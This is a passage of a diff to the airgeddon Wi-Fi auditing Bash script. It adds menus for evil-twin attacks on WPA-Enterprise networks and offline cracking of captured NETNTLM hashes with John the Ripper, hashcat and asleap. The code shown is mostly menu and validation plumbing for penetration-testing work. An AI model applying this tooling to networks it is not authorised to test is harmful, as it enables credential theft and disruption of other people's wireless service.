 	if [ "${1}" = "dos_pursuit_mode" ]; then
 		secondary_ifaces=$(iwconfig 2>&1 | grep "802.11" | grep -v "no wireless extensions" | grep "${interface}" -v | awk '{print $1}')
@@ -1992,7 +2185,6 @@ function select_secondary_et_interface() {
 
 	option_counter=0
 	for item in ${secondary_ifaces}; do
-
 		if [ ${option_counter} -eq 0 ]; then
 			if [ "${1}" = "dos_pursuit_mode" ]; then
 				language_strings "${language}" 511 "green"
@@ -2000,7 +2192,11 @@ function select_secondary_et_interface() {
 				language_strings "${language}" 279 "green"
 			fi
 			print_simple_separator
-			language_strings "${language}" 266
+			if [ -n "${enterprise_mode}" ]; then
+				language_strings "${language}" 521
+			else
+				language_strings "${language}" 266
+			fi
 			print_simple_separator
 		fi
 
@@ -2020,8 +2216,12 @@ function select_secondary_et_interface() {
 	done
 
 	if [ ${option_counter} -eq 0 ]; then
-		return_to_et_main_menu=1
-		return_to_et_main_menu_from_beef=1
+		if [ -n "${enterprise_mode}" ]; then
+			return_to_enterprise_main_menu=1
+		else
+			return_to_et_main_menu=1
+			return_to_et_main_menu_from_beef=1
+		fi
 
 		echo
 		if [ "${1}" = "dos_pursuit_mode" ]; then
@@ -2040,8 +2240,12 @@ function select_secondary_et_interface() {
 
 	read -rp "> " secondary_iface
 	if [ "${secondary_iface}" -eq 0 ]; then
-		return_to_et_main_menu=1
-		return_to_et_main_menu_from_beef=1
+		if [ -n "${enterprise_mode}" ]; then
+			return_to_enterprise_main_menu=1
+		else
+			return_to_et_main_menu=1
+			return_to_et_main_menu_from_beef=1
+		fi
 		return 1
 	elif [[ ! ${secondary_iface} =~ ^[[:digit:]]+$ ]] || (( secondary_iface < 1 || secondary_iface > option_counter )); then
 		if [ "${1}" = "dos_pursuit_mode" ]; then
@@ -2097,11 +2301,15 @@ function select_interface() {
 			interface_menu_band=""
 			if check_interface_wifi "${item}"; then
 				interface_menu_band+="${blue_color}// ${pink_color}"
-				if get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"; then
-					interface_menu_band+="${band_24ghz}, ${band_5ghz}"
-				else
-					interface_menu_band+="${band_24ghz}"
-				fi
+				get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
+				case "$?" in
+					"1")
+						interface_menu_band+="${band_24ghz}"
+					;;
+					*)
+						interface_menu_band+="${band_24ghz}, ${band_5ghz}"
+					;;
+				esac
 			fi
 			echo -e "${interface_menu_band} ${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
 		fi
@@ -2180,7 +2388,7 @@ function read_channel() {
 	debug_print
 
 	echo
-	if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 		language_strings "${language}" 25 "green"
 	else
 		language_strings "${language}" 517 "green"
@@ -2199,7 +2407,7 @@ function ask_channel() {
 	debug_print
 
 	local regexp
-	if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 		regexp="^${valid_channels_24_ghz_regexp}$"
 	else
 		regexp="^${valid_channels_24_and_5_ghz_regexp}$"
@@ -2207,7 +2415,7 @@ function ask_channel() {
 
 	if [ "${1}" = "wps" ]; then
 		if [[ -n "${wps_channel}" ]] && [[ "${wps_channel}" -gt 14 ]]; then
-			if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				echo
 				language_strings "${language}" 515 "red"
 				language_strings "${language}" 115 "read"
@@ -2222,7 +2430,7 @@ function ask_channel() {
 		language_strings "${language}" 365 "blue"
 	else
 		if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
-			if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				echo
 				language_strings "${language}" 515 "red"
 				language_strings "${language}" 115 "read"
@@ -2238,6 +2446,26 @@ function ask_channel() {
 	fi
 
 	return 0
+}
+
+#Read the user input on asleap challenge
+function read_challenge() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 553 "green"
+	read -rp "> " enterprise_asleap_challenge
+}
+
+#Read the user input on asleap response
+function read_response() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 554 "green"
+	read -rp "> " enterprise_asleap_response
 }
 
 #Read the user input on bssid questions
@@ -2641,7 +2869,7 @@ function set_wep_key_script() {
 	cat >&8 <<-EOF
 		kill_wep_script_windows
 		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
-		touch "${tmpdir}${wepdir}${wep_processes_file}"
+		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
 	EOF
 
 	cat >&8 <<-'EOF'
@@ -3188,7 +3416,7 @@ function launch_dos_pursuit_mode_attack() {
 
 	if [ "${channel}" -gt 14 ]; then
 		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
-			if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				echo
 				language_strings "${language}" 515 "red"
 				kill_dos_pursuit_mode_processes
@@ -3198,7 +3426,7 @@ function launch_dos_pursuit_mode_attack() {
 				airodump_band_modifier="abg"
 			fi
 		else
-			if [ "${secondary_interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				echo
 				language_strings "${language}" 515 "red"
 				kill_dos_pursuit_mode_processes
@@ -3210,13 +3438,13 @@ function launch_dos_pursuit_mode_attack() {
 		fi
 	else
 		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
-			if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				airodump_band_modifier="bg"
 			else
 				airodump_band_modifier="abg"
 			fi
 		else
-			if [ "${secondary_interface_supported_bands}" = "${band_24ghz}" ]; then
+			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 				airodump_band_modifier="bg"
 			else
 				airodump_band_modifier="abg"
@@ -3729,22 +3957,52 @@ function print_options() {
 
 	debug_print
 
-	if [ "${auto_update}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
 		language_strings "${language}" 451 "blue"
 	else
 		language_strings "${language}" 452 "blue"
 	fi
 
-	if [ "${allow_colorization}" -eq 1 ]; then
+	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
+		language_strings "${language}" 567 "blue"
+	else
+		language_strings "${language}" 568 "blue"
+	fi
+
+	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
+		language_strings "${language}" 563 "blue"
+	else
+		language_strings "${language}" 564 "blue"
+	fi
+
+	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
 		language_strings "${language}" 453 "blue"
 	else
 		language_strings "${language}" 454 "blue"
 	fi
 
-	if [ "${auto_change_language}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
 		language_strings "${language}" 474 "blue"
 	else
 		language_strings "${language}" 475 "blue"
+	fi
+
+	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
+		language_strings "${language}" 575 "blue"
+	else
+		language_strings "${language}" 576 "blue"
+	fi
+
+	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
+		language_strings "${language}" 582 "blue"
+	else
+		language_strings "${language}" 583 "blue"
+	fi
+
+	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
+		language_strings "${language}" 594 "blue"
+	else
+		language_strings "${language}" 595 "blue"
 	fi
 }
 
@@ -3915,8 +4173,46 @@ function print_all_target_vars_wps() {
 	fi
 }
 
-#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file and rules file)
+#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file, rules file and enterprise stuff)
 function print_decrypt_vars() {
+
+	debug_print
+
+	if [ -n "${jtrenterpriseenteredpath}" ]; then
+		language_strings "${language}" 605 "blue"
+	else
+		language_strings "${language}" 606 "blue"
+	fi
+
+	if [ -n "${hashcatenterpriseenteredpath}" ]; then
+		language_strings "${language}" 603 "blue"
+	else
+		language_strings "${language}" 604 "blue"
+	fi
+
+	if [ -n "${bssid}" ]; then
+		language_strings "${language}" 43 "blue"
+	else
+		language_strings "${language}" 185 "blue"
+	fi
+
+	if [ -n "${enteredpath}" ]; then
+		language_strings "${language}" 173 "blue"
+	else
+		language_strings "${language}" 177 "blue"
+	fi
+
+	if [ -n "${DICTIONARY}" ]; then
+		language_strings "${language}" 182 "blue"
+	fi
+
+	if [ -n "${RULES}" ]; then
+		language_strings "${language}" 243 "blue"
+	fi
+}
+
+#Print selected target parameters on personal decrypt menu (bssid, Handshake file, dictionary file and rules file)
+function print_personal_decrypt_vars() {
 
 	debug_print
 
@@ -3930,6 +4226,32 @@ function print_decrypt_vars() {
 		language_strings "${language}" 173 "blue"
 	else
 		language_strings "${language}" 177 "blue"
+	fi
+
+	if [ -n "${DICTIONARY}" ]; then
+		language_strings "${language}" 182 "blue"
+	fi
+
+	if [ -n "${RULES}" ]; then
+		language_strings "${language}" 243 "blue"
+	fi
+}
+
+#Print selected target parameters on enterprise decrypt menu (dictionary file, rules file and hashes files)
+function print_enterprise_decrypt_vars() {
+
+	debug_print
+
+	if [ -n "${jtrenterpriseenteredpath}" ]; then
+		language_strings "${language}" 605 "blue"
+	else
+		language_strings "${language}" 606 "blue"
+	fi
+
+	if [ -n "${hashcatenterpriseenteredpath}" ]; then
+		language_strings "${language}" 603 "blue"
+	else
+		language_strings "${language}" 604 "blue"
 	fi
 
 	if [ -n "${DICTIONARY}" ]; then
@@ -3962,6 +4284,10 @@ function initialize_menu_options_dependencies() {
 	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
 	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
 	wep_attack_dependencies=(${optional_tools_names[2]} ${optional_tools_names[20]})
+	enterprise_attack_dependencies=(${optional_tools_names[21]} ${optional_tools_names[22]})
+	asleap_attacks_dependencies=(${optional_tools_names[22]})
+	john_attacks_dependencies=(${optional_tools_names[23]})
+	johncrunch_attacks_dependencies=(${optional_tools_names[23]} ${optional_tools_names[1]})
 }
 
 #Set possible changes for some commands that can be found in different ways depending of the O.S.
@@ -4008,6 +4334,14 @@ function initialize_menu_and_print_selections() {
 		"decrypt_menu")
 			print_decrypt_vars
 		;;
+		"personal_decrypt_menu")
+			print_personal_decrypt_vars
+		;;
+		"enterprise_decrypt_menu")
+			print_enterprise_decrypt_vars
+			enterprise_asleap_challenge=""
+			enterprise_asleap_response=""
+		;;
 		"handshake_tools_menu")
 			print_iface_selected
 			print_all_target_vars
@@ -4025,6 +4359,7 @@ function initialize_menu_and_print_selections() {
 			print_iface_selected
 		;;
 		"evil_twin_attacks_menu")
+			enterprise_mode=""
 			return_to_et_main_menu=0
 			retry_handshake_capture=0
 			return_to_et_main_menu_from_beef=0
@@ -4037,15 +4372,27 @@ function initialize_menu_and_print_selections() {
 			print_iface_selected
 			print_all_target_vars_et
 		;;
+		"enterprise_attacks_menu")
+			return_to_enterprise_main_menu=0
+			enterprise_mode=""
+			et_processes=()
+			secondary_wifi_interface=""
+			print_iface_selected
+			print_all_target_vars
+		;;
 		"et_dos_menu")
 			dos_pursuit_mode=0
-			if [ ${retry_handshake_capture} -eq 1 ]; then
-				retry_handshake_capture=0
-				retrying_handshake_capture=1
-			fi
 			print_iface_selected
-			print_et_target_vars
-			print_iface_internet_selected
+			if [ -n "${enterprise_mode}" ]; then
+				print_all_target_vars
+			else
+				if [ ${retry_handshake_capture} -eq 1 ]; then
+					retry_handshake_capture=0
+					retrying_handshake_capture=1
+				fi
+				print_et_target_vars
+				print_iface_internet_selected
+			fi
 		;;
 		"wps_attacks_menu")
 			print_iface_selected
@@ -4073,6 +4420,14 @@ function initialize_menu_and_print_selections() {
 	esac
 }
 
+#Clean environment vars
+function clean_env_vars() {
+
+	debug_print
+
+	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE
+}
+
 #Clean temporary files
 function clean_tmpfiles() {
 
@@ -4084,10 +4439,14 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}clts"* > /dev/null 2>&1
 	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
 	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
+	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
@@ -4098,6 +4457,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
 		rm -rf "${dhcp_path}" > /dev/null 2>&1
 	fi
@@ -4225,6 +4586,20 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[decrypt_hints|${randomhint}]}
 		;;
+		"personal_decrypt_menu")
+			store_array hints personal_decrypt_hints "${personal_decrypt_hints[@]}"
+			hintlength=${#personal_decrypt_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[personal_decrypt_hints|${randomhint}]}
+		;;
+		"enterprise_decrypt_menu")
+			store_array hints enterprise_decrypt_hints "${enterprise_decrypt_hints[@]}"
+			hintlength=${#enterprise_decrypt_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[enterprise_decrypt_hints|${randomhint}]}
+		;;
 		"select_interface_menu")
 			store_array hints select_interface_hints "${select_interface_hints[@]}"
 			hintlength=${#select_interface_hints[@]}
@@ -4281,10 +4656,19 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[beef_hints|${randomhint}]}
 		;;
+		"enterprise_attacks_menu")
+			store_array hints enterprise_hints "${enterprise_hints[@]}"
+			hintlength=${#enterprise_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[enterprise_hints|${randomhint}]}
+		;;
 	esac
 
-	print_simple_separator
-	language_strings "${language}" "${strtoprint}" "hint"
+	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
+		print_simple_separator
+		language_strings "${language}" "${strtoprint}" "hint"
+	fi
 	print_simple_separator
 }
 
@@ -4311,6 +4695,7 @@ function main_menu() {
 	language_strings "${language}" 252
 	language_strings "${language}" 333
 	language_strings "${language}" 426
+	language_strings "${language}" 57
 	print_simple_separator
 	language_strings "${language}" 60
 	language_strings "${language}" 444
@@ -4349,9 +4734,12 @@ function main_menu() {
 			wep_attacks_menu
 		;;
 		10)
-			credits_option
+			enterprise_attacks_menu
 		;;
 		11)
+			credits_option
+		;;
+		12)
 			option_menu
 		;;
 		*)
@@ -4360,6 +4748,84 @@ function main_menu() {
 	esac
 
 	main_menu
+}
+
+#Enterprise attacks menu
+function enterprise_attacks_menu() {
+
+	debug_print
+
+	clear
+	language_strings "${language}" 84 "title"
+	current_menu="enterprise_attacks_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 59
+	language_strings "${language}" 48
+	language_strings "${language}" 55
+	language_strings "${language}" 56
+	language_strings "${language}" 49
+	language_strings "${language}" 117 "separator"
+	language_strings "${language}" 260 enterprise_attack_dependencies[@]
+	language_strings "${language}" 248 "separator"
+	language_strings "${language}" 307 enterprise_attack_dependencies[@]
+	print_hint ${current_menu}
+
+	read -rp "> " enterprise_option
+	case ${enterprise_option} in
+		0)
+			return
+		;;
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option "${interface}"
+		;;
+		3)
+			managed_option "${interface}"
+		;;
+		4)
+			explore_for_targets_option "WPA" "enterprise"
+		;;
+		5)
+			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					enterprise_mode="smooth"
+					et_dos_menu "enterprise"
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		6)
+			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					enterprise_mode="noisy"
+					et_dos_menu "enterprise"
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	enterprise_attacks_menu
 }
 
 #Evil Twin attacks menu
@@ -5033,6 +5499,42 @@ function decrypt_menu() {
 	language_strings "${language}" 47 "green"
 	print_simple_separator
 	language_strings "${language}" 59
+	language_strings "${language}" 534
+	language_strings "${language}" 535
+	print_hint ${current_menu}
+
+	read -rp "> " decrypt_option
+	case ${decrypt_option} in
+		0)
+			return
+		;;
+		1)
+			personal_decrypt_menu
+		;;
+		2)
+			enterprise_decrypt_menu
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	decrypt_menu
+}
+
+#Offline personal decryption attacks menu
+function personal_decrypt_menu() {
+
+	debug_print
+
+	clear
+	language_strings "${language}" 170 "title"
+	current_menu="personal_decrypt_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 536
 	language_strings "${language}" 176 "separator"
 	language_strings "${language}" 172
 	language_strings "${language}" 175 aircrack_attacks_dependencies[@]
@@ -5042,50 +5544,50 @@ function decrypt_menu() {
 	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
 	print_hint ${current_menu}
 
-	read -rp "> " decrypt_option
-	case ${decrypt_option} in
+	read -rp "> " personal_decrypt_option
+	case ${personal_decrypt_option} in
 		0)
 			return
 		;;
 		1)
-			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
+			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
 				aircrack_dictionary_attack_option
 			fi
 		;;
 		2)
-			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
+			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
 				aircrack_bruteforce_attack_option
 			fi
 		;;
 		3)
-			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
+			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_dictionary_attack_option
+				hashcat_dictionary_attack_option "personal"
 			fi
 		;;
 		4)
-			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
+			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_bruteforce_attack_option
+				hashcat_bruteforce_attack_option "personal"
 			fi
 		;;
 		5)
-			if contains_element "${decrypt_option}" "${forbidden_options[@]}"; then
+			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_rulebased_attack_option
+				hashcat_rulebased_attack_option "personal"
 			fi
 		;;
 		*)
@@ -5093,7 +5595,94 @@ function decrypt_menu() {
 		;;
 	esac
 
-	decrypt_menu
+	personal_decrypt_menu
+}
+
+#Offline enterprise decryption attacks menu
+function enterprise_decrypt_menu() {
+
+	debug_print
+
+	clear
+	language_strings "${language}" 170 "title"
+	current_menu="enterprise_decrypt_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 536
+	language_strings "${language}" 544 "separator"
+	language_strings "${language}" 545 john_attacks_dependencies[@]
+	language_strings "${language}" 546 johncrunch_attacks_dependencies[@]
+	language_strings "${language}" 229 "separator"
+	language_strings "${language}" 550 hashcat_attacks_dependencies[@]
+	language_strings "${language}" 551 hashcat_attacks_dependencies[@]
+	language_strings "${language}" 552 hashcat_attacks_dependencies[@]
+	language_strings "${language}" 548 "separator"
+	language_strings "${language}" 549 asleap_attacks_dependencies[@]
+	print_hint ${current_menu}
+
+	read -rp "> " enterprise_decrypt_option
+	case ${enterprise_decrypt_option} in
+		0)
+			return
+		;;
+		1)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				get_jtr_version
+				enterprise_jtr_dictionary_attack_option
+			fi
+		;;
+		2)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				get_jtr_version
+				enterprise_jtr_bruteforce_attack_option
+			fi
+		;;
+		3)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				get_hashcat_version
+				set_hashcat_parameters
+				hashcat_dictionary_attack_option "enterprise"
+			fi
+		;;
+		4)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				get_hashcat_version
+				set_hashcat_parameters
+				hashcat_bruteforce_attack_option "enterprise"
+			fi
+		;;
+		5)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				get_hashcat_version
+				set_hashcat_parameters
+				hashcat_rulebased_attack_option "enterprise"
+			fi
+		;;
+		6)
+			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				enterprise_asleap_dictionary_attack_option
+			fi
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	enterprise_decrypt_menu
 }
 
 #Read the user input on rules file questions
@@ -5120,33 +5709,90 @@ function ask_dictionary() {
 	language_strings "${language}" 181 "yellow"
 }
 
-#Read the user input on Handshake file questions
+#Read the user input on Handshake/enterprise file questions
 function ask_capture_file() {
 
 	debug_print
 
 	validpath=1
-	while [[ "${validpath}" != "0" ]]; do
-		read_path "targetfilefordecrypt"
-	done
+
+	if [ "${1}" = "personal" ]; then
+		while [[ "${validpath}" != "0" ]]; do
+			read_path "targetfilefordecrypt"
+		done
+	else
+		if [ "${2}" = "hashcat" ]; then
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "targethashcatenterprisefilefordecrypt"
+			done
+		else
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "targetjtrenterprisefilefordecrypt"
+			done
+		fi
+	fi
 	language_strings "${language}" 189 "yellow"
 }
 
-#Manage the questions on Handshake file questions
+#Manage the questions on Handshake/enterprise file questions
 function manage_asking_for_captured_file() {
 
 	debug_print
 
-	if [ -n "${enteredpath}" ]; then
-		echo
-		language_strings "${language}" 186 "blue"
-		ask_yesno 187 "yes"
-		if [ "${yesno}" = "n" ]; then
-			ask_capture_file
+	if [ "${1}" = "personal" ]; then
+		if [ -n "${enteredpath}" ]; then
+			echo
+			language_strings "${language}" 186 "blue"
+			ask_yesno 187 "yes"
+			if [ "${yesno}" = "n" ]; then
+				ask_capture_file "${1}" "${2}"
+			fi
+		else
+			ask_capture_file "${1}" "${2}"
 		fi
 	else
-		ask_capture_file
+		if [ "${2}" = "hashcat" ]; then
+			if [ -n "${hashcatenterpriseenteredpath}" ]; then
+				echo
+				language_strings "${language}" 600 "blue"
+				ask_yesno 187 "yes"
+				if [ "${yesno}" = "n" ]; then
+					ask_capture_file "${1}" "${2}"
+				fi
+			else
+				ask_capture_file "${1}" "${2}"
+			fi
+		else
+			if [ -n "${jtrenterpriseenteredpath}" ]; then
+				echo
+				language_strings "${language}" 609 "blue"
+				ask_yesno 187 "yes"
+				if [ "${yesno}" = "n" ]; then
+					ask_capture_file "${1}" "${2}"
+				fi
+			else
+				ask_capture_file "${1}" "${2}"
+			fi
+		fi
 	fi
+}
+
+#Manage the questions on challenge response input
+manage_asking_for_challenge_response() {
+
+	debug_print
+
+	local regexp="^([[:xdigit:]]{2}:){7}[[:xdigit:]]{2}$"
+
+	while [[ ! ${enterprise_asleap_challenge} =~ ${regexp} ]]; do
+		read_challenge
+	done
+
+	regexp="^([[:xdigit:]]{2}:){23}[[:xdigit:]]{2}$"
+
+	while [[ ! ${enterprise_asleap_response} =~ ${regexp} ]]; do
+		read_response
+	done
 }
 
 #Manage the questions on dictionary file questions
@@ -5343,12 +5989,72 @@ function select_wpa_bssid_target_from_captured_file() {
 	return 0
 }
 
+#Validate if given file has a valid enterprise john the ripper format
+function validate_enterprise_jtr_file() {
+
+	debug_print
+
+	echo
+	readarray -t JTR_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)
+
+	for item in "${JTR_LINES_TO_VALIDATE[@]}"; do
+		if [[ ! "${item}" =~ ^.+:\$NETNTLM\$[[:xdigit:]\$]+$ ]]; then
+			language_strings "${language}" 607 "red"
+			language_strings "${language}" 115 "read"
+			return 1
+		fi
+	done
+
+	language_strings "${language}" 608 "blue"
+	language_strings "${language}" 115 "read"
+	return 0
+}
+
+#Validate if given file has a valid enterprise hashcat format
+function validate_enterprise_hashcat_file() {
+
+	debug_print
+
+	echo
+	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)
+
+	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
+		if [[ ! "${item}" =~ ^(.+)::::(.+):(.+)$ ]]; then
+			language_strings "${language}" 601 "red"
+			language_strings "${language}" 115 "read"
+			return 1
+		fi
+	done
+
+	language_strings "${language}" 602 "blue"
+	language_strings "${language}" 115 "read"
+	return 0
+}
+
+#Validate and ask for the different parameters used in an enterprise asleap dictionary based attack
+function enterprise_asleap_dictionary_attack_option() {
+
+	debug_print
+
+	manage_asking_for_challenge_response
+	manage_asking_for_dictionary_file
+
+	echo
+	language_strings "${language}" 190 "yellow"
+	language_strings "${language}" 115 "read"
+
+	echo
+	exec_asleap_attack "offline_menu"
+	echo
+	manage_asleap_pot "offline_menu"
+}
+
 #Validate and ask for the different parameters used in an aircrack dictionary based attack
 function aircrack_dictionary_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file
+	manage_asking_for_captured_file "personal" "aircrack"
 
 	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 		return
@@ -5368,13 +6074,13 @@ function aircrack_bruteforce_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file
+	manage_asking_for_captured_file "personal" "aircrack"
 
 	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 		return
 	fi
 
-	set_minlength_and_maxlength
+	set_minlength_and_maxlength "personal"
 
 	charset_option=0
 	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
@@ -5390,18 +6096,14 @@ function aircrack_bruteforce_attack_option() {
 	manage_aircrack_pot
 }
 
-#Validate and ask for the different parameters used in a hashcat dictionary based attack
-function hashcat_dictionary_attack_option() {
+#Validate and ask for the different parameters used in a john the ripper dictionary based attack
+function enterprise_jtr_dictionary_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file
+	manage_asking_for_captured_file "enterprise" "jtr"
 
-	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
-		return
-	fi
-
-	if ! convert_cap_to_hashcat_format; then
+	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
 		return
 	fi
 
@@ -5410,8 +6112,65 @@ function hashcat_dictionary_attack_option() {
 	echo
 	language_strings "${language}" 190 "yellow"
 	language_strings "${language}" 115 "read"
-	exec_hashcat_dictionary_attack
-	manage_hashcat_pot
+	exec_jtr_dictionary_attack
+	manage_jtr_pot
+}
+
+#Validate and ask for the different parameters used in a john the ripper bruteforce based attack
+function enterprise_jtr_bruteforce_attack_option() {
+
+	debug_print
+
+	manage_asking_for_captured_file "enterprise" "jtr"
+
+	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
